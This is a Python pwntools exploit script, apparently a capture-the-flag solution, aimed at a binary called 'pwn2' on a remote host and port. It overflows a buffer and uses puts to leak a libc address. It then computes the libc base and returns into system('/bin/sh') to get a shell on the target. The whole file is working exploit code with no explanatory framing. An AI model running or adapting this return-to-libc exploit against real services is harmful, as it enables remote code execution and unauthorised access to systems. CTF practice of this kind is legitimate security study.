#coding: utf-8
from pwn import *

context(arch='i386', os='linux')
target = 'pwn2'
remote_addr = '123.59.138.180'
remote_port = 20000

p = remote(remote_addr, remote_port)
libc = ELF('./libc6-i386_2.23-0ubuntu10_amd64.so')
elf = ELF('./pwn2')

def foo(payload):
	name = 'A' * 255
	p.sendafter('name?\n', name)
	noble = 'l' * 255
	p.sendafter('occupation?\n', noble)
	p.sendafter('[Y/N]\n', 'Y')
	p.send(payload)

put = elf.plt['puts']
junk = 'A' * 277
payload = junk + p32(put) + p32(0x08048637) + p32(elf.got['puts'])
foo(payload)
p_addr = u32(p.recvuntil('\xf7')[-4:])
success(hex(p_addr))
libc.address = p_addr - libc.symbols['puts']
success(hex(libc.address))
success(hex(libc.symbols['system']))
payload2 = junk + p32(libc.symbols['system']) + p32(0) + p32(next(libc.search('/bin/sh')))
foo(payload2)